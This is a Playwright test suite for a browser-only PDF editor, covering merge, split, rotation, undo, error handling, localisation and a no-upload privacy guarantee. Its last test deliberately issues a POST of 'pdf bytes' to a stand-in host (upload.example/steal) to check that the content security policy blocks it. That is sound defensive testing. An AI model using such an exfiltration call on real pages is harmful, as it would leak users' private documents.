import { expect, test as base, type Download, type Page } from '@playwright/test';
import { unzipSync } from 'fflate';
import { readFile, rm, writeFile } from 'node:fs/promises';
import { describePdf, makeEncryptedPdf, makeHalfBrokenPdf, makePdf } from '../fixtures';

const pdfFile = (name: string, bytes: Uint8Array) => ({ name, mimeType: 'application/pdf', buffer: Buffer.from(bytes) });

// a.pdf: pages 501, 502, 503 wide. b.pdf: 601, 602 (landscape). The width identifies each page in the output.
async function openFixtures(page: Page) {
  const a = await makePdf([501, 502, 503].map((width, i) => ({ width, label: `A${i + 1}` })));
  const b = await makePdf([
    { width: 601, label: 'B1' },
    { width: 602, height: 400, label: 'B2' },
  ]);
  await page.getByTestId('file-input').setInputFiles([pdfFile('a.pdf', a), pdfFile('b.pdf', b)]);
  await expect(page.locator('.card')).toHaveCount(5);
  await expect(page.locator('.card img')).toHaveCount(5); // all previews rendered
}

const cards = (page: Page) => page.locator('.card');
const card = (page: Page, n: number) => cards(page).nth(n);

async function downloadBytes(download: Download) {
  return new Uint8Array(await readFile((await download.path())!));
}

async function widthsAndRotations(bytes: Uint8Array) {
  return (await describePdf(bytes)).map((p) => `${p.width}@${p.rotation}`);
}

/**
 * Every test opens the app and, when it ends, checks the privacy guarantee:
 * the page only ever reads (GET) from its own origin, and nothing is logged as an error.
 * Anything else is blocked on the spot and fails the test, so no file content can leave the browser.
 */
const test = base.extend<{ app: Page }>({
  app: async ({ page, context, baseURL }, use) => {
    const origin = new URL(baseURL!).origin;
    const forbidden: string[] = [];
    const errors: string[] = [];
    const isAllowed = (method: string, rawUrl: string) => {
      const url = new URL(rawUrl);
      if (url.protocol === 'data:') return true;
      // blob: URLs carry the origin that created them.
      return url.origin === origin && method === 'GET';
    };
    await context.route('**/*', (route) => {
      const request = route.request();
      if (isAllowed(request.method(), request.url())) return route.continue();
      forbidden.push(`${request.method()} ${request.url()}`);
      return route.abort();
    });
    // Second net for requests that never reach the router.
    context.on('request', (request) => {
      const entry = `${request.method()} ${request.url()}`;
      if (!isAllowed(request.method(), request.url()) && !forbidden.includes(entry)) forbidden.push(entry);
    });
    page.on('pageerror', (e) => errors.push(e.message));
    page.on('console', (m) => {
      if (m.type() === 'error') errors.push(m.text());
    });
    await page.goto('/');
    await use(page);
    expect(forbidden, 'requests other than GET to the own origin').toEqual([]);
    expect(errors, 'console errors').toEqual([]);
  },
});

test('shows the empty state with the privacy promise', async ({ app: page }) => {
  await expect(page.getByRole('heading', { name: 'PDFgoat' })).toBeVisible();
  await expect(page.getByText('Nichts wird hochgeladen')).toBeVisible();
  await expect(page.getByRole('button', { name: /PDF hier ablegen/ })).toBeVisible();
  await expect(page.locator('html')).toHaveAttribute('lang', 'de');
});

test('merges two files after rotating, deleting and reordering', async ({ app: page }) => {
  await openFixtures(page);
  await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();

  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click(); // A1 → 90°
  await card(page, 1).getByLabel('Seite löschen').click(); // A2 gone: A1 A3 B1 B2
  await card(page, 3).dragTo(card(page, 1), { targetPosition: { x: 5, y: 50 } }); // B2 before A3
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@90', '602@0', '503@0', '601@0']);
});

test('undo restores the previous order', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 0).getByLabel('Nach rechts verschieben').click();
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.getByRole('button', { name: 'Rückgängig' }).click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@0', '503@0', '601@0', '602@0',
  ]);
});

test('redo brings back what undo removed, by button and by keyboard', async ({ app: page }) => {
  await openFixtures(page);
  const redo = page.getByRole('button', { name: 'Wiederholen' });
  await expect(redo).toBeDisabled();

  await card(page, 0).getByLabel('Seite löschen').click(); // A1 gone
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.keyboard.press('Control+z');
  await expect(cards(page)).toHaveCount(5);
  await redo.click(); // A1 gone again
  await page.keyboard.press('Control+y'); // reversed again
  await expect(redo).toBeDisabled();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '602@0', '601@0', '503@0', '502@0',
  ]);
});

test('rotates and deletes a shift-click selection', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').click();
  await card(page, 3).locator('.card-thumb').click({ modifiers: ['Shift'] });
  await expect(page.getByText('3 ausgewählt')).toBeVisible();
  await page.getByRole('button', { name: 'Links drehen' }).click();
  await page.keyboard.press('Escape'); // clear the selection
  await card(page, 4).locator('.card-thumb').click();
  await page.keyboard.press('Delete');
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@270', '503@270', '601@270',
  ]);
});

test('no longer counts a file once all of its pages are deleted', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).getByLabel('Seite löschen').click();
  await card(page, 3).getByLabel('Seite löschen').click();
  await expect(page.locator('.status')).toContainText('3 Seiten');
  await expect(page.locator('.status')).not.toContainText('Dateien');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect((await download).suggestedFilename()).toBe('a.pdf');
});

// Sync folders, scanners and cleaned-up download folders change files behind the browser's back.
test('still saves the opened pages after the file on disk was overwritten and deleted', async ({ app: page }, testInfo) => {
  const path = testInfo.outputPath('vertrag.pdf');
  await writeFile(path, await makePdf([{ width: 501 }, { width: 502 }]));
  await page.getByTestId('file-input').setInputFiles(path);
  await expect(cards(page)).toHaveCount(2);

  await writeFile(path, await makePdf([{ width: 999 }]));
  await rm(path);
  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@90', '502@0']);
});

test('splits by page ranges into a ZIP', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: 'Aufteilen', exact: false }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('1-2, 3, 4-');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-aufgeteilt.zip');

  const parts = unzipSync(await downloadBytes(file));
  expect(Object.keys(parts)).toEqual([
    'zusammengefuegt-01_S1-2.pdf',
    'zusammengefuegt-02_S3.pdf',
    'zusammengefuegt-03_S4-5.pdf',
  ]);
  expect(await widthsAndRotations(parts['zusammengefuegt-03_S4-5.pdf'])).toEqual(['601@0', '602@0']);
});

test('shows an error for an invalid range and keeps the dialog open', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('2-9');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  await expect(page.getByRole('alert')).toContainText('außerhalb von 1–5');
  await expect(page.getByRole('dialog')).toBeVisible();
});

test('saves the selection as one PDF', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).locator('.card-thumb').click();
  await card(page, 0).locator('.card-thumb').click();
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-auswahl.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@0', '602@0']);
});

test('opens the large preview and steps through pages', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').dblclick();
  const dialog = page.getByRole('dialog');
  await expect(dialog).toContainText('Seite 2 von 5');
  await expect(dialog.locator('img')).toBeVisible();
  await page.keyboard.press('ArrowRight');
  await expect(dialog).toContainText('Seite 3 von 5');
  await page.keyboard.press('Escape');
  await expect(dialog).toBeHidden();
});

test('renders previews only for pages near the visible area', async ({ app: page }) => {
  const many = await makePdf(Array.from({ length: 80 }, () => ({ width: 300, height: 400 })));
  await page.getByTestId('file-input').setInputFiles(pdfFile('viele.pdf', many));
  await expect(cards(page)).toHaveCount(80);
  await expect(card(page, 0).locator('img')).toBeVisible();

  const last = card(page, 79);
  await expect(last.locator('img')).toHaveCount(0);
  expect(await page.locator('.card img').count()).toBeLessThan(80);

  await last.scrollIntoViewIfNeeded();
  await expect(last.locator('img')).toBeVisible();
});

test('shows a PDF with an embedded font and loads PDF.js only when a file is opened', async ({ app: page }) => {
  const scripts = () => page.evaluate(() => performance.getEntriesByType('resource').map((r) => r.name));
  expect((await scripts()).some((name) => name.includes('pdf.worker'))).toBe(false);

  const bytes = await readFile(new URL('../files/embedded-font.pdf', import.meta.url));
  await page.getByTestId('file-input').setInputFiles(pdfFile('schrift.pdf', bytes));
  await expect(card(page, 0).locator('img')).toBeVisible();
  expect((await scripts()).some((name) => name.includes('pdf.worker'))).toBe(true);
});

test('a damaged page shows a placeholder, and the good pages can still be saved', async ({ page }) => {
  // Not the `app` fixture: the browser reports the damaged page in its console, which is expected here.
  await page.goto('/');
  await page.getByTestId('file-input').setInputFiles(pdfFile('halb.pdf', await makeHalfBrokenPdf()));
  await expect(cards(page)).toHaveCount(2);
  await expect(card(page, 0).locator('img')).toBeVisible();
  await expect(card(page, 1)).toContainText('Keine Vorschau');

  await page.getByRole('button', { name: 'PDF speichern' }).click();
  await expect(page.getByRole('alert')).toContainText('Seite 2 von „halb.pdf“ ist beschädigt');

  await card(page, 1).getByLabel('Seite löschen').click();
  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@0']);
});

test.describe('files that cannot be opened', () => {
  test('rejects files that are not PDFs', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('kaputt.pdf', Buffer.from('das ist kein pdf')));
    await expect(page.getByRole('alert')).toContainText('„kaputt.pdf“ konnte nicht als PDF gelesen werden');
    await expect(cards(page)).toHaveCount(0);
  });

  test('rejects a password-protected PDF with a clear message', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', await makeEncryptedPdf()));
    await expect(page.getByRole('alert')).toContainText('„geheim.pdf“ ist passwortgeschützt oder verschlüsselt');
    await expect(cards(page)).toHaveCount(0);
  });

  // Such a file opens without a password, but saving it would silently produce empty pages.
  test('rejects a PDF that is encrypted with an owner password only', async ({ app: page }) => {
    const bytes = await readFile(new URL('../files/owner-encrypted.pdf', import.meta.url));
    await page.getByTestId('file-input').setInputFiles(pdfFile('gesperrt.pdf', bytes));
    await expect(page.getByRole('alert')).toContainText('„gesperrt.pdf“ ist passwortgeschützt oder verschlüsselt');
    await expect(cards(page)).toHaveCount(0);
  });

  test('names every broken file and still opens the good ones', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles([
      pdfFile('eins.pdf', Buffer.from('kaputt')),
      pdfFile('gut.pdf', await makePdf([{ width: 300 }])),
      pdfFile('zwei.pdf', Buffer.from('auch kaputt')),
    ]);
    const alert = page.getByRole('alert');
    await expect(alert).toContainText('„eins.pdf“');
    await expect(alert).toContainText('„zwei.pdf“');
    await expect(cards(page)).toHaveCount(1);
  });
});

test.describe('languages', () => {
  test('switches to English, keeps the choice and names downloads in English', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await expect(page.getByText('Nothing is uploaded')).toBeVisible();
    await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    await expect(page).toHaveTitle(/edit PDFs without uploading/);

    await page.reload();
    await expect(page.getByRole('button', { name: /Drop a PDF here/ })).toBeVisible();

    await openFixtures(page);
    await expect(page.getByText('5 pages from 2 files')).toBeVisible();
    await page.getByRole('button', { name: 'Split', exact: false }).first().click();
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('9');
    await page.getByRole('button', { name: 'Split & download' }).click();
    await expect(page.getByRole('alert')).toContainText('“9” is outside 1–5.');
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('1-2, 3-');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Split & download' }).click();
    const file = await download;
    expect(file.suggestedFilename()).toBe('merged-split.zip');
    expect(Object.keys(unzipSync(await downloadBytes(file)))).toEqual(['merged-01_p1-2.pdf', 'merged-02_p3-5.pdf']);

    await page.getByRole('button', { name: 'Deutsch' }).click();
    await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();
  });

  test.describe('with an English browser', () => {
    test.use({ locale: 'en-US' });

    test('starts in English', async ({ app: page }) => {
      await expect(page.getByText('Nothing is uploaded')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    });
  });

  test.describe('with a browser in another language', () => {
    test.use({ locale: 'fr-FR' });

    test('falls back to English', async ({ app: page }) => {
      await expect(page.getByRole('button', { name: /Drop a PDF here/ })).toBeVisible();
    });
  });
});

// These tests provoke a blocked request on purpose, so they do not use the `app` fixture.
base.describe('content security policy', () => {
  base('is part of the page and allows connections to the own origin only', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).not.toMatch(/'unsafe-eval'/);

    // The headers file for the host carries the same policy and the usual hardening headers.
    const headers = await readFile(new URL('../../dist/_headers', import.meta.url), 'utf8');
    expect(headers).toContain(`Content-Security-Policy: ${csp}; frame-ancestors 'none'`);
    expect(headers).toContain('X-Content-Type-Options: nosniff');
    expect(headers).toContain('Referrer-Policy: no-referrer');
  });

  base('makes the browser itself refuse to send data to another server', async ({ page, context }) => {
    // Should the policy ever fail, the request still must not reach the internet.
    let reachedNetwork = false;
    await context.route('https://upload.example/**', (route) => {
      reachedNetwork = true;
      return route.abort();
    });
    await page.goto('/');
    const result = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective), { once: true }),
      );
      const sent = await fetch('https://upload.example/steal', { method: 'POST', body: 'pdf bytes' }).then(
        () => true,
        () => false,
      );
      return { sent, directive: await violation };
    });
    expect(result).toEqual({ sent: false, directive: 'connect-src' });
    expect(reachedNetwork).toBe(false);
  });
});
